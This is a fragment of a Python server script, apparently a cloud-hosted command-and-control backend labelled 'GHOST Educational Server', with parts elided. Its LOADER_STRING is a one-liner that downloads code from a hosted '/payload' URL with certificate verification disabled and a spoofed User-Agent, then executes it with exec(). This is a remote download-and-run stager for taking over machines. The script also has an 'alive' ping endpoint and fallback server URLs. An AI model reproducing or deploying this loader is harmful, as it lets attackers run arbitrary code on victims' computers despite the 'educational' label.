#!/usr/bin/env python3
"""
GHOST Educational Server v10.0
Cloud Edition (Render.com ready).
No tunnels, no Termux, pure cloud.
"""
...
SERVER_URL = None
FALLBACK_URLS = ["https://ghost-edu.onrender.com"]
processing = False
alive = True
...
# Замените ghost-edu на ваше имя приложения, если оно отличается
LOADER_STRING = "import urllib.request,ssl;exec(urllib.request.urlopen(urllib.request.Request('https://ghost-edu.onrender.com/payload',headers={'User-Agent':'M'}),context=ssl._create_unverified_context()).read().decode())"
...
def ping():
    return jsonify({'status': 'alive', 'version': '10.0'})
...
if __name__ == '__main__':
    ...
    print(f"Server v10.0 | Cloud Edition | Port: {port} | {TARGET_MODEL}")
